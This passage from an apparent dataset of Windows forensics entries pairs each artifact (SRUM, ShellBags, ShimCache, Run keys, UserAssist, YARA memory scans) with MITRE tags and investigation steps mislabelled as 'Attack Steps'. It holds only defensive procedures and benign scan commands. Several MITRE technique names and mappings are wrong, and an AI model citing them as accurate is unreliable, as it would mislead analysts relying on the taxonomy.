- **Vulnerability**: Lack of user activity monitoring
- **MITRE**: T1204 (User Execution)
- **Impact**: Reveal exact executed apps even after user deletion
- **Tools**: RegRipper, Registry Explorer
- **Scenario**: Malware was executed but the user denies launching it. Registry keys under RecentApps reveal execution history.
- **Attack Steps**: 1. Extract the user’s NTUSER.DAT hive from the suspect machine.2. Use RegRipper plugin recentapps or open the hive with Registry Explorer.3. Navigate to Software\Microsoft\Windows\CurrentVersion\Search\RecentApps.4. Review entries and look for executables launched that aren't normal for the user (e.g., suspicious PowerShell scripts, rare programs).5. Correlate application names with their executable paths and launch times.6. Cross-reference timestamps with known compromise window or other artifacts (e.g., logs or SRUM).7. Identify any executables dropped by malware or executed as payloads from phishing documents.8. Use the findings to confirm user activity or dispute false claims about "not clicking on anything".
- **Detection**: NTUSER.DAT + registry timeline + search behavior
- **Solution**: Implement App Whitelisting and behavior logging
- **Tags**: recentapps, ntuser, forensic-tracing, malware-execution

## Analyzing Shellbags to Reconstruct File Access

- **Attack Type**: File Activity Analysis
- **Target**: Endpoint
- **Vulnerability**: No tracking of folder navigation
- **MITRE**: T1005 (Data from Local System)
- **Impact**: Reveal hidden file access behavior
- **Tools**: ShellBags Explorer, Registry Explorer
- **Scenario**: Adversary accessed sensitive folders, and Shellbags reveal folder navigation even if files were deleted.
- **Attack Steps**: 1. Dump the user’s NTUSER.DAT and USRCLASS.DAT registry hives from the affected system.2. Use ShellBags Explorer to load and parse the data.3. Look for entries in the registry keys under Shell\BagMRU and Shell\Bags.4. Identify folder paths recently accessed, especially those in sensitive locations like Downloads, Confidential, or removable drives.5. Check for folders that no longer exist—indicating deletion post-incident.6. Cross-reference access times with SRUM or prefetch data for consistency.7. If sensitive directories were opened before data loss was noticed, infer probable staging of data theft or review.8. Export the evidence and tag it with timestamps and user context.
- **Detection**: Registry bagMRU structure comparison
- **Solution**: Monitor folder access via behavioral EDR + registry diff
- **Tags**: shellbags, folder-access, deleted-folders, ntuser-analysis

## Discovering Beaconing Tools via SRUM Analysis

- **Attack Type**: Network Forensics
- **Target**: Windows 10+
- **Vulnerability**: SRUM unmonitored by traditional AV tools
- **MITRE**: T1071 (Application Layer Protocol)
- **Impact**: Identify covert network activity post-incident
- **Tools**: SRUM-Dump, KAPE, Registry Explorer
- **Scenario**: Malware used C2 communication over HTTP. SRUM reveals past application network usage that firewall logs missed.
- **Attack Steps**: 1. Acquire the SYSTEM registry hive and the SRUDB.dat file from C:\Windows\System32\sru\ directory.2. Use tools like SRUM-Dump or KAPE to parse the database.3. Analyze Application Resource Usage entries for unexpected network activity.4. Look for executables that shouldn’t communicate externally (e.g., svchost.exe, random.exe) but have high data usage.5. Note the destination IPs and ports used.6. Map timeline of execution and match with known attack window.7. Correlate results with process listings and memory artifacts.8. Use this to identify applications that were silently beaconing out, even if logs were deleted.
- **Detection**: SRUM + Registry Hive + Network pattern matching
- **Solution**: Incorporate SRUM parsing in standard forensic checklist
- **Tags**: SRUM, beaconing, sru.db, C2-communication, memory-correlation

## Tracing Execution History via ShimCache

- **Attack Type**: Execution Analysis
- **Target**: Workstation
- **Vulnerability**: Logs missing, no visibility on execution
- **MITRE**: T1059 (Command and Scripting Interpreter)
- **Impact**: Determine what was run even after logs deleted
- **Tools**: AppCompatCache Parser, PEStudio
- **Scenario**: Unknown malware was executed. ShimCache helped pinpoint executable run, despite missing logs.
- **Attack Steps**: 1. Extract the SYSTEM registry hive from the affected host.2. Use AppCompatCache Parser to parse ShimCache (a.k.a. Application Compatibility Cache).3. Look for any unusual file paths or executables, especially in temporary or user-writable directories.4. Note timestamps and compare with compromise timeline.5. Use PEStudio to statically analyze the binary if it still exists.6. Compare file hash with threat intelligence sources.7. Correlate with prefetch, SRUM, and memory analysis to determine if and when it was run.8. Use it to fill gaps when logs and prefetch are cleared.
- **Detection**: ShimCache parsing + process correlation
- **Solution**: Always parse AppCompatCache during incident review
- **Tags**: shimcache, appcompat, execution-tracing, malware-analysis

## Finding Suspicious Services in Registry

- **Attack Type**: Persistence
- **Target**: Windows Servers
- **Vulnerability**: Service abuse for stealth persistence
- **MITRE**: T1543.003 (Create or Modify System Process)
- **Impact**: Stealthy persistence via Windows Services
- **Tools**: Autoruns, RegRipper
- **Scenario**: A malicious service was installed to maintain access. Registry Services keys retain all service configurations.
- **Attack Steps**: 1. Load SYSTEM and SOFTWARE hives from the infected machine.2. Navigate to HKLM\SYSTEM\CurrentControlSet\Services.3. Use RegRipper plugin services or view manually using Registry Explorer.4. Identify suspicious or non-standard services with unexpected names, paths, or executables.5. Compare service parameters like ImagePath, Start, and Type to detect abnormal configurations.6. Cross-check services with active process list and network activity.7. Use Autoruns to see if the service is set to auto-start.8. Investigate the binary behind the service and disable/remove it if confirmed malicious.
- **Detection**: Compare service keys with known good configs
- **Solution**: Implement service whitelisting + alert on unknown additions
- **Tags**: registry-services, persistence, reg-ripper, autoruns

## Investigating Registry-Based Backdoors

- **Attack Type**: Backdoor Discovery
- **Target**: Endpoints
- **Vulnerability**: No alerting for new registry entries
- **MITRE**: T1547.001 (Registry Run Keys / Startup Folder)
- **Impact**: Persistent unauthorized access
- **Tools**: Registry Editor, Regshot
- **Scenario**: Attacker added a custom key to start a reverse shell or malicious process automatically.
- **Attack Steps**: 1. Perform a diff comparison using Regshot before and after suspected compromise.2. Focus on Run, RunOnce, and Wow6432Node keys.3. Identify any unfamiliar keys or suspicious executables listed.4. Check if the path points to a valid file and analyze its origin.5. Investigate whether the process spawns connections or child processes.6. Validate with event logs to confirm creation or modification time.7. Remove and quarantine the key and binary if confirmed malicious.8. Document for further reporting and SIEM tuning.
- **Detection**: Registry diffing tools + behavior-based monitoring
- **Solution**: Implement registry change monitoring
- **Tags**: backdoor, runkey, registry-startup, regshot

## Correlating Prefetch + Registry for Execution Timeline

- **Attack Type**: Timeline Reconstruction
- **Target**: Workstation
- **Vulnerability**: Missing logs, disjointed execution artifacts
- **MITRE**: T1070 (Indicator Removal)
- **Impact**: Rebuild attacker behavior post-execution
- **Tools**: WinPrefetchView, Registry Explorer
- **Scenario**: Analyst needs to build a timeline showing exact execution of malicious binaries. Combines prefetch and registry.
- **Attack Steps**: 1. Extract Prefetch files (.pf) and load them in WinPrefetchView.2. Extract NTUSER.DAT and SOFTWARE hives for corresponding application data.3. Correlate prefetch LastRunTime with RecentApps, RunMRU, or ShellBags registry keys.4. Establish a chain showing when the app was run, how it got launched, and its persistence.5. Use this to visualize attacker movement during lateral movement.6. Cross-reference with Event ID 4688 or other execution logs if available.7. Rebuild attacker’s timeline for report and post-mortem.8. Confirm with SRUM data to backfill gaps.
- **Detection**: Timeline matching: Prefetch + Registry + SRUM
- **Solution**: Use multiple artifact sources to reconstruct activity
- **Tags**: registry-timeline, prefetch, srum, ntuser, attacker-behavior

## Registry Indicators of Remote Access Tools

- **Attack Type**: RAT Detection
- **Target**: Corporate Assets
- **Vulnerability**: RATs persist via hidden registry entries
- **MITRE**: T1219 (Remote Access Software)
- **Impact**: Hidden remote access to internal systems
- **Tools**: Autoruns, Registry Explorer, VirusTotal
- **Scenario**: Registry revealed indicators of hidden remote access tools like Quasar RAT or njRAT that were not detected by AV.
- **Attack Steps**: 1. Acquire SYSTEM and SOFTWARE hives.2. Use Autoruns to identify strange autorun entries in the registry.3. Search registry keys under Run, Services, or Wow6432Node for executables referencing known RATs.4. Use VirusTotal to analyze unknown binaries.5. Look for known file paths and mutexes associated with tools like Quasar or njRAT.6. Validate using memory or network analysis to catch actual runtime behavior.7. Remove registry entry and disable autorun if malicious.8. Flag as part of larger APT activity or persistence mechanism.
- **Detection**: Autoruns + Registry + VirusTotal triage
- **Solution**: Maintain blacklist of known RAT file paths and keys
- **Tags**: registry, RATs, autoruns, quasar, njrat, remote-access

## Detect Beaconing via SRUM Network Records

- **Attack Type**: Post-Incident Analysis
- **Target**: Workstation
- **Vulnerability**: C2 Beaconing
- **MITRE**: T1071
- **Impact**: Persistence, Exfiltration
- **Tools**: SRUM-Dump, NirSoft SRUMViewer
- **Scenario**: SRUM logs are analyzed post-incident to detect malware that maintained periodic C2 beaconing to an external IP.
- **Attack Steps**: 1. Obtain a copy of the suspect system’s C:\Windows\System32\sru\SRUDB.dat. 2. Use SRUM-Dump.py or NirSoft SRUMViewer to parse the SRUM database. 3. Navigate to Network Usage data which stores connection time, bytes sent/received. 4. Filter for applications that consistently communicate with a single remote IP over time. 5. Identify regular time intervals that suggest beaconing behavior (e.g., every 10 minutes). 6. Match Application GUID to actual process names using registry (SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\Repository\Packages). 7. Map the remote IPs to ASN or known malicious IP reputation databases. 8. Correlate this information with timeline or memory analysis to confirm active malware presence. 9. Report this C2 activity and quarantine the affected system.
- **Detection**: Monitor periodic external IP communication in SRUM
- **Solution**: Use firewall rules, isolate IPs, block domains
- **Tags**: SRUM, Beaconing, Network Forensics

## Identify Anomalous Upload Spikes

- **Attack Type**: Network Artifact Analysis
- **Target**: Endpoint
- **Vulnerability**: Data Exfiltration
- **MITRE**: T1041
- **Impact**: Confidentiality loss
- **Tools**: SRUM-Dump, PowerShell
- **Scenario**: Malware uses standard Windows processes (e.g., svchost) to exfiltrate data; SRUM captures the network data usage for each app container.
- **Attack Steps**: 1. Export SRUM database from system. 2. Use PowerShell or SRUM-Dump to extract data usage from Application Resource Usage and Network Usage tables. 3. Sort the entries by data volume uploaded (Bytes Sent). 4. Compare upload volume with baseline usage for known system processes like svchost.exe or explorer.exe. 5. Investigate any upload activity during odd hours or from uncommon applications. 6. Map App IDs with registry paths to resolve actual process names. 7. Verify if the process has a network connection using netstat or memory artifacts. 8. Trace if any large document files or archives were accessed or copied around that time. 9. Document findings and notify security operations for containment.
- **Detection**: Compare upload spikes to expected norms
- **Solution**: Restrict upload permissions, monitor outbound
- **Tags**: SRUM, Exfiltration, Endpoint

## Uncover Suspicious Executables With High Network Usage

- **Attack Type**: Behavior-Based Detection
- **Target**: Workstation
- **Vulnerability**: Untrusted Executables
- **MITRE**: T1105
- **Impact**: Payload Delivery
- **Tools**: SRUM-Dump.py, Regedit
- **Scenario**: Attacker executes a trojanized application that downloads multiple payloads over time. SRUM shows high usage.
- **Attack Steps**: 1. Acquire the SRUDB.dat file. 2. Run SRUM-Dump.py to list all AppGUIDs and network stats. 3. Sort processes by cumulative bytes received. 4. Look for executables with unusually high inbound traffic not typical of normal user behavior. 5. Use the Application ID to identify full package names via registry under AppModel. 6. Cross-reference process creation times with Prefetch or timeline to confirm suspicious launches. 7. Check if downloaded payloads exist on disk or only in memory (hinting at fileless execution). 8. Match destination IPs with threat intelligence to identify known malware infrastructure. 9. Mark and isolate system for full forensic triage.
- **Detection**: Monitor network usage per executable
- **Solution**: Block unknown apps via AppLocker
- **Tags**: SRUM, Payload, Download

## Analyze SRUM for VPN Abuse by Malware

- **Attack Type**: Post-Breach Activity
- **Target**: Corporate Workstation
- **Vulnerability**: Network Obfuscation
- **MITRE**: T1090
- **Impact**: C2 via VPN Tunnel
- **Tools**: SRUMViewer, IP geolocation tools
- **Scenario**: Malware hides C2 traffic via a VPN process. SRUM still captures its bandwidth footprint.
- **Attack Steps**: 1. Extract SRUM DB and load into SRUMViewer. 2. Locate processes with large outbound usage. 3. Identify VPN processes (NordVPN, ProtonVPN, etc.) via App ID to name mapping. 4. Match time windows with suspicious activity from logs (e.g., login from unusual locations). 5. Analyze geolocation of connected IPs using online services. 6. Check consistency of the VPN process's start/stop behavior and destination IP diversity. 7. Investigate for process injection if VPN clients were abused. 8. Use memory dump or disk forensics to examine VPN app integrity. 9. Log findings for IR escalation.
- **Detection**: Monitor VPN session behavior via SRUM
- **Solution**: Enforce strict VPN client integrity, allowlist IPs
- **Tags**: SRUM, VPN, Obfuscation

## Detect Long-Term Malware via SRUM Timeline

- **Attack Type**: Timeline Analysis
- **Target**: Laptop
- **Vulnerability**: Persistence
- **MITRE**: T1053
- **Impact**: Long-term data theft
- **Tools**: SRUM-Dump, Excel
- **Scenario**: Persistent malware communicates periodically but low-bandwidth over months.
- **Attack Steps**: 1. Gather SRUM DB from system. 2. Parse using SRUM-Dump to extract daily or weekly data volumes. 3. Visualize data per AppGUID over time using Excel. 4. Identify apps with consistent daily network activity despite user not initiating them. 5. Check for odd network behavior on weekends or holidays. 6. Investigate app container identities using registry keys. 7. Correlate with Task Scheduler or Registry persistence keys. 8. Use Plaso or Timeline to align SRUM activity with system events. 9. Flag and investigate anomalies for malware behavior.
- **Detection**: Baseline and compare long-term network stats
- **Solution**: Kill persistence, remove malware
- **Tags**: SRUM, Timeline, Persistence

## Identify Rogue Tools with SRUM Data

- **Attack Type**: Tool Usage Detection
- **Target**: Internal Asset
- **Vulnerability**: Unauthorized Tool Use
- **MITRE**: T1210
- **Impact**: Policy Violation
- **Tools**: SRUMViewer, Custom Scripts
- **Scenario**: Unauthorized network scanning tool used and left no logs but SRUM records its usage.
- **Attack Steps**: 1. Export SRUM database. 2. Check network usage logs for non-standard process names. 3. Match AppGUIDs with registry for true process identities. 4. Identify unknown tools that consumed unusual upload/download bandwidth. 5. Cross-reference activity time with user logon/logoff and known events. 6. Validate existence of tool binaries using MFT or $Logfile analysis. 7. Compare activity with internal policy of allowed tools. 8. Report tool usage as policy violation or potential red flag. 9. Isolate system and flag as incident.
- **Detection**: Detect unknown tools consuming network
- **Solution**: Audit tool usage policy
- **Tags**: SRUM, Rogue Tool, Scanning

## Detect Proxy-Based Backdoors Using SRUM

- **Attack Type**: Covert Communication
- **Target**: Server
- **Vulnerability**: Backdoor Proxy Setup
- **MITRE**: T1090.001
- **Impact**: Lateral Movement
- **Tools**: SRUM-Dump, Sysmon
- **Scenario**: Attacker configures Windows machine as a proxy to tunnel traffic.
- **Attack Steps**: 1. Parse SRUM to view data usage by system services. 2. Identify persistent high-volume traffic to unknown destinations from system processes. 3. Match with proxy settings in registry (Internet Settings or ProxyEnable). 4. Confirm process identities and command line args via Sysmon logs. 5. Determine duration of this behavior and volume of relayed data. 6. Investigate DNS cache or packet captures to confirm tunneling. 7. Search for SOCKS proxy software traces (e.g., 3proxy, Tor). 8. Alert SOC and remove proxy configs. 9. Block proxy software via GPO.
- **Detection**: Identify excessive system traffic with proxy config
- **Solution**: Remove proxy settings, kill backdoor
- **Tags**: SRUM, Proxy, C2

## Discover Unknown Schedulers with High Bandwidth

- **Attack Type**: Artifact Correlation
- **Target**: Desktop
- **Vulnerability**: Scheduled Task Abuse
- **MITRE**: T1053
- **Impact**: Stealthy Exfiltration
- **Tools**: SRUM + Task Scheduler Logs
- **Scenario**: Custom scheduler (e.g., schtasks) launches exfiltration app during off-hours
- **Attack Steps**: 1. Use SRUM to find apps with high traffic between midnight–6 AM. 2. Extract process names via App ID resolution. 3. Search for matching entries in Task Scheduler XMLs. 4. Check for newly created or modified scheduled tasks. 5. Align timestamps of task trigger and SRUM network activity. 6. Validate binaries for signs of packing or evasion. 7. Investigate remote IPs or hostnames for C2 traits. 8. Remove malicious tasks and applications. 9. Document for forensic report.
- **Detection**: Correlate SRUM activity with task triggers
- **Solution**: Disable rogue tasks, block executables
- **Tags**: SRUM, Scheduler, Task Abuse

## Identify Unknown App Containers Communicating Online

- **Attack Type**: App Container Abuse
- **Target**: Windows 10+ System
- **Vulnerability**: Container Evasion
- **MITRE**: T1202
- **Impact**: Firewall Evasion
- **Tools**: SRUM, AppModel Registry
- **Scenario**: Attacker uses modern UWP-style app container to bypass firewall and communicate externally
- **Attack Steps**: 1. Dump SRUM DB. 2. Identify AppGUIDs with internet activity. 3. Resolve those to app containers using AppModel\Repository\Packages. 4. Spot unknown or suspicious names (e.g., not system apps). 5. Check package creation times and originating user. 6. Investigate if app manifest is altered or manually created. 7. Confirm binary contents using hash comparison. 8. If unsigned or altered, treat as abuse. 9. Remove container and revoke permissions.
- **Detection**: Detect unknown container comms
- **Solution**: Remove, revoke app containers
- **Tags**: SRUM, UWP, Firewall Bypass

## SRUM + Registry Correlation for Rogue Updates

- **Attack Type**: Persistence Mechanism
- **Target**: Laptop
- **Vulnerability**: Fake Update Mechanism
- **MITRE**: T1036.003
- **Impact**: Long-Term Persistence
- **Tools**: SRUM, Registry Viewer
- **Scenario**: Malware disguises itself as a Windows Update process and persists using registry + network comms
- **Attack Steps**: 1. Parse SRUM to locate processes with high network usage that resemble update clients. 2. Check their corresponding executable paths. 3. Search registry for entries in Run, RunOnce, and Services tied to same processes. 4. Identify any unsigned or out-of-place binaries in WindowsUpdate or SoftwareDistribution folders. 5. Cross-validate process integrity via hashes. 6. Look for associated scheduled tasks or services pointing to these binaries. 7. Investigate timeline for installation context. 8. Remove registry entries and delete fake update client. 9. Create detection rules for similar behavior.
- **Detection**: Match high network usage with registry startup
- **Solution**: Remove startup keys, block binary
- **Tags**: SRUM, Registry, Fake Update

## Extract USB History from Registry (USBSTOR)

- **Attack Type**: Artifact Extraction
- **Target**: Windows Workstation
- **Vulnerability**: Lack of removable device audit trail
- **MITRE**: T1005 – Data from Removable Media
- **Impact**: Provides insight into external device use, possible data exfiltration
- **Tools**: RegRipper, FTK Imager, Registry Explorer
- **Scenario**: Analysts want to determine what USB devices were connected to a compromised system.
- **Attack Steps**: 1. Acquire a forensic image of the system’s disk. 2. Mount or extract the SYSTEM hive from the image using FTK Imager or similar. 3. Open the hive using Registry Explorer or RegRipper. 4. Navigate to SYSTEM\CurrentControlSet\Enum\USBSTOR. 5. Each entry represents a previously connected USB device. 6. Examine subkeys to identify serial numbers and device types. 7. Correlate with MountedDevices to identify drive letters. 8. Cross-check with event logs and prefetch files for usage patterns. 9. Document findings in the case report. 10. Preserve hashes and maintain chain of custody.
- **Detection**: Registry timeline diffing, access log analysis
- **Solution**: Implement DLP policies and enforce USB control via Group Policy
- **Tags**: registry, usb, t1005, removable media, windows

## Investigate Malware Persistence via RunOnce Registry Key

- **Attack Type**: Persistence Mechanism Analysis
- **Target**: Windows Workstation
- **Vulnerability**: No auditing of one-time execution keys
- **MITRE**: T1547.001 – Registry Run Keys
- **Impact**: Malware gains execution post-reboot using stealthy RunOnce keys
- **Tools**: Registry Explorer, RegRipper
- **Scenario**: Investigate if malware used RunOnce to execute payload after reboot.
- **Attack Steps**: 1. Mount the suspect system’s disk image. 2. Locate and extract the NTUSER.DAT hive for each user profile. 3. Use Registry Explorer to open the NTUSER.DAT. 4. Navigate to Software\Microsoft\Windows\CurrentVersion\RunOnce. 5. Look for entries pointing to executables or scripts. 6. Review the full path and filenames; cross-reference with known malware. 7. Check creation and modification timestamps for timing context. 8. Compare entries between users to detect anomalies. 9. Document malicious paths and prepare evidence for reporting. 10. Recommend persistence-clearing steps.
- **Detection**: Monitor Run/RunOnce keys with Sysmon or WMI filters
- **Solution**: Disable RunOnce if unused and regularly audit registry entries
- **Tags**: registry, runonce, persistence, malware, t1547

## Analyze Autostart Locations in Registry for Backdoors

- **Attack Type**: Malware Persistence Detection
- **Target**: Windows System
- **Vulnerability**: Hidden registry startup paths
- **MITRE**: T1547 – Boot or Logon Autostart
- **Impact**: Unauthorized programs auto-start and persist across reboots
- **Tools**: Autoruns, Registry Explorer, KAPE
- **Scenario**: Attackers install registry-based backdoors for automatic startup.
- **Attack Steps**: 1. Use KAPE or FTK Imager to collect registry hives from the target system. 2. Launch Autoruns to scan collected hives for autostart entries. 3. Investigate keys like Run, RunOnce, RunServices, Winlogon\Userinit, etc. 4. Examine each entry's path and execution file. 5. Compare against known good baselines or a clean machine. 6. Note suspicious or unknown paths, especially from temp directories. 7. Correlate with Prefetch or ShimCache for execution evidence. 8. Create a timeline to track persistence creation. 9. Check if paths match IOCs from threat intel feeds. 10. Archive findings with hashes and screenshots.
- **Detection**: Baseline diffing, Sysmon Event ID 13
- **Solution**: Implement AppLocker and conduct registry audits
- **Tags**: registry, autoruns, t1547, malware startup

## Recover Program Execution Evidence via ShimCache

- **Attack Type**: Program Execution Reconstruction
- **Target**: Windows Workstation
- **Vulnerability**: Volatile execution history not logged elsewhere
- **MITRE**: T1059 – Command & Scripting Interpreter
- **Impact**: Reveals deleted or hidden program execution history
- **Tools**: ShimCacheParser, HxD, FTK Imager
- **Scenario**: Recover evidence of program execution from registry even if apps were deleted.
- **Attack Steps**: 1. Extract the SYSTEM hive from the image using FTK Imager. 2. Launch ShimCacheParser or parse manually with hex editor (e.g., HxD). 3. Locate AppCompatCache in the SYSTEM hive. 4. Parse entries to extract file paths, last modified times, and execution flags. 5. Identify binaries from suspicious paths (e.g., temp, recycle bin). 6. Correlate with Prefetch and Event Logs to confirm execution. 7. Look for gaps indicating stealth tools. 8. Document suspicious file paths and timestamps. 9. Cross-check with known malware binaries. 10. Archive evidence, maintaining integrity.
- **Detection**: Parse ShimCache and correlate with Prefetch
- **Solution**: Monitor suspicious path executions using EDR
- **Tags**: shimcache, registry, program history, t1059

## Detect Beaconing via SRUM Network Activity

- **Attack Type**: Anomaly Detection
- **Target**: Windows System
- **Vulnerability**: Lack of C2 traffic visibility in traditional logs
- **MITRE**: T1071 – Application Layer Protocol
- **Impact**: Exposes covert beaconing activity for malware C2
- **Tools**: SRUM Dump, SQLite DB Browser, Plaso
- **Scenario**: Identify malware communicating to C2 using SRUM network logs.
- **Attack Steps**: 1. Extract SRUDB.dat from %windir%\System32\sru. 2. Use SRUM Dump or SQLite DB Browser to open and parse the SRUM database. 3. Focus on tables like NetworkUsage to retrieve app-to-IP communications. 4. Identify processes sending consistent traffic to the same IP at fixed intervals. 5. Flag unusually high byte counts from suspicious apps. 6. Correlate IP addresses with threat intel or VirusTotal. 7. Match process names with Prefetch/registry for context. 8. Generate timeline using Plaso to visualize beaconing patterns. 9. Document anomalies with screenshots and logs. 10. Export report for incident escalation.
- **Detection**: Analyze SRUM NetworkUsage table patterns
- **Solution**: Use EDRs that flag unusual outbound traffic patterns
- **Tags**: srum, beaconing, c2, t1071, registry network

## Identify Network Aware Apps via SRUM Data

- **Attack Type**: Network Profiling
- **Target**: Windows Workstation
- **Vulnerability**: No consolidated app-to-network linkage in logs
- **MITRE**: T1041 – Exfiltration over C2 Channel
- **Impact**: Discovers tools used by attacker for data exfiltration or spread
- **Tools**: SQLite Browser, SRUM Dump
- **Scenario**: Analysts want to know what apps generated network traffic over time.
- **Attack Steps**: 1. Extract the SRUDB.dat from the suspect system. 2. Open the DB with SQLite Browser. 3. Query NetworkUsage table to list all apps with outbound/inbound traffic. 4. Sort by timestamp to get communication chronology. 5. Map AppID to known binaries via registry or Prefetch. 6. Highlight unknown or unsigned executables. 7. Export high-traffic apps and examine their registry paths. 8. Correlate with DNS cache or NetFlow logs. 9. Identify tools used by attacker for exfil or lateral movement. 10. Save query results and create an audit trail.
- **Detection**: Timeline generation using Plaso & registry
- **Solution**: Network sandboxing and traffic shaping
- **Tags**: srum, registry, network, exfiltration, t1041

## Trace User Logins via Registry UserAssist Keys

- **Attack Type**: User Activity Reconstruction
- **Target**: Windows Workstation
- **Vulnerability**: User activity logs easily cleared from other areas
- **MITRE**: T1078 – Valid Accounts
- **Impact**: Identifies user behavior patterns and suspicious usage
- **Tools**: Registry Explorer, UserAssist Tool
- **Scenario**: Analysts want to track interactive usage of programs by specific users.
- **Attack Steps**: 1. Extract the NTUSER.DAT for each user. 2. Use UserAssistView or Registry Explorer to decode the keys at Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist. 3. Parse ROT13-encoded app names. 4. Identify number of executions and last execution time. 5. Highlight suspicious programs frequently run by user. 6. Map executable names to file system paths. 7. Correlate execution with known malware indicators. 8. Check registry keys for time-of-day activity. 9. Present timeline of usage for forensic report. 10. Export decoded data for archival.
- **Detection**: Decode and analyze UserAssist registry keys
- **Solution**: Regular audit of UserAssist activity
- **Tags**: registry, userassist, logins, t1078

## Examine OpenSaveMRU for Exfil Suspicions

- **Attack Type**: File Access Artifact
- **Target**: Windows Workstation
- **Vulnerability**: No monitoring of MRU (most recently used) artifacts
- **MITRE**: T1020 – Automated Exfiltration
- **Impact**: Reveals which files attacker accessed before exfiltration
- **Tools**: Registry Explorer, FTK Imager
- **Scenario**: Determine what files were recently opened or saved, suspecting exfiltration.
- **Attack Steps**: 1. Mount image and extract NTUSER.DAT hive. 2. Use Registry Explorer to open Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU. 3. Identify file types and filenames recently accessed. 4. Look for files in removable media or synced folders. 5. Highlight file types like .xls, .doc, .zip for potential exfil. 6. Match file names with USB registry or cloud sync tools. 7. Correlate with SRUM or Prefetch for app-level context. 8. Note unusual file paths. 9. Preserve artifacts for legal chain. 10. Report for escalation if corporate data involved.
- **Detection**: MRU registry analysis with timeline correlation
- **Solution**: Implement MRU cleaners or strict DLP policies
- **Tags**: registry, opensave, mru, t1020, exfiltration

## Parse Shellbags to Discover Folder Access

- **Attack Type**: Folder Traversal Reconstruction
- **Target**: Windows Workstation
- **Vulnerability**: Folder access logs are not available elsewhere
- **MITRE**: T1083 – File and Directory Discovery
- **Impact**: Reveals directory access patterns of users or malware
- **Tools**: ShellBags Explorer, Registry Explorer
- **Scenario**: Understand which directories a user browsed through, even deleted ones.
- **Attack Steps**: 1. Extract NTUSER.DAT and USRCLASS.DAT hives. 2. Open with ShellBags Explorer or Registry Explorer. 3. Locate keys at Local Settings\Software\Microsoft\Windows\Shell\BagMRU. 4. Parse path entries and timestamps. 5. Identify folders accessed (local, remote, USB, etc.). 6. Cross-check for access to exfil paths or malware folders. 7. Build a map of folder navigation activity. 8. Document previously existing folders that were deleted. 9. Cross-reference with known IOCs. 10. Save parsed output in case notes.
- **Detection**: Shellbags parsing and directory structure analysis
- **Solution**: Use forensic tools to track deleted folder access
- **Tags**: shellbags, folder traversal, t1083, registry

## Extract RecentDocs for Document Activity

- **Attack Type**: File Usage Forensics
- **Target**: Windows Workstation
- **Vulnerability**: No security monitoring for document access in registry
- **MITRE**: T1119 – Automated Collection
- **Impact**: Shows access to important business files by attacker
- **Tools**: Registry Explorer, FTK Imager
- **Scenario**: Determine recent document access for business-sensitive file investigation.
- **Attack Steps**: 1. Acquire and mount forensic image. 2. Locate and extract the NTUSER.DAT hive. 3. Navigate to Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs. 4. Identify recently accessed documents by extension. 5. Decode filenames and sort by type and time. 6. Look for documents opened from suspicious locations. 7. Check against project codes, financial data, or client records. 8. Correlate with USB, cloud sync, or email usage. 9. Export parsed data for incident documentation. 10. Flag documents suspected of being leaked or copied.
- **Detection**: Compare recentdocs with USB and browser activity
- **Solution**: Monitor access to sensitive files via DLP or audit policies
- **Tags**: registry, recentdocs, t1119, document usage

## YARA Scan on RAM Dump to Identify Malware Signature

- **Attack Type**: Memory Analysis
- **Target**: Windows Host
- **Vulnerability**: No Patch (post-compromise)
- **MITRE**: T1055.001 (Process Injection)
- **Impact**: Detect malware signatures in memory
- **Tools**: YARA, Volatility
- **Scenario**: A forensic analyst needs to scan a RAM dump for malware indicators after a suspected ransomware attack
- **Attack Steps**: 1. Acquire a live memory dump using tools like FTK Imager or DumpIt.2. Install YARA and ensure the malware rules are updated or customized.3. Use volatility -f memdump.raw --profile=Win10x64_18362 yarascan --yara-rules=my_rules.yar.4. Review YARA scan hits for strings or signatures indicating malware presence.5. Map identified offsets to memory regions using Volatility’s vaddump or memdump plugin.6. Extract and store suspicious memory regions for further analysis.
- **Detection**: Memory forensics, rule-based matching
- **Solution**: Patch infection vector, update YARA rules
- **Tags**: yara, volatility, memory-forensics

## YARA Signature Match on Disk Files

- **Attack Type**: Static Disk Analysis
- **Target**: Windows Filesystem
- **Vulnerability**: Malicious dropper
- **MITRE**: T1204 (User Execution)
- **Impact**: Detect dropped malware pre-execution
- **Tools**: YARA
- **Scenario**: Suspicious PE files are found in a staging directory and need to be validated for malware
- **Attack Steps**: 1. Install YARA on the forensic workstation.2. Update or build a YARA rule file (e.g., apt_rules.yar).3. Run yara apt_rules.yar suspicious.exe.4. If matches found, examine which rule triggered (e.g., "TrickBot loader").5. Hash and isolate the matching file for deeper sandbox analysis.6. Log metadata, including path and matched rule, for report.
- **Detection**: YARA match + file behavior correlation
- **Solution**: Block executable, remove from disk, scan other hosts
- **Tags**: yara, disk-forensics, static-analysis

## Matching Packed Malware Samples in Memory with Custom YARA Rules

- **Attack Type**: Memory Forensics
- **Target**: Windows Host
- **Vulnerability**: Obfuscated payload
- **MITRE**: T1027 (Obfuscated Files or Info)
- **Impact**: Identify packed malware bypassing detection
- **Tools**: YARA, Volatility
- **Scenario**: Analysts suspect malware using packing or obfuscation evaded AV, now reside in memory
- **Attack Steps**: 1. Dump system memory with DumpIt or Magnet RAM Capture.2. Build YARA rules that match known packer behaviors (e.g., UPX, Themida markers).3. Use Volatility's yarascan plugin to scan the dump with these rules.4. Correlate matched memory regions with running processes (pslist, malfind).5. Extract process memory using procdump plugin.6. Unpack samples using upx -d or sandbox for analysis.
- **Detection**: Memory YARA + unpacking behavior
- **Solution**: Unpack and scan, block obfuscator signature
- **Tags**: packing, yara, volatility, evasive-malware

## Scan Suspicious Folder for Known Payloads Using YARA

- **Attack Type**: Static Analysis
- **Target**: Windows Filesystem
- **Vulnerability**: Embedded malware in archive
- **MITRE**: T1059 (Command and Scripting Interpreter)
- **Impact**: Detect malware dropper early
- **Tools**: YARA
- **Scenario**: A ZIP archive contains binaries suspected to be part of a phishing campaign
- **Attack Steps**: 1. Extract contents of the ZIP to a sandboxed environment.2. Use a curated YARA rule set (e.g., malicious_behaviors.yar).3. Run yara malicious_behaviors.yar extracted_folder/.4. Review results — check which files matched and match descriptions.5. Validate file hashes against VirusTotal.6. Store positives for sandbox testing.
- **Detection**: File YARA + hash correlation
- **Solution**: Block ZIP archive distribution
- **Tags**: yara, archive-analysis, phishing

## Detecting Ransomware Payload via YARA in Memory

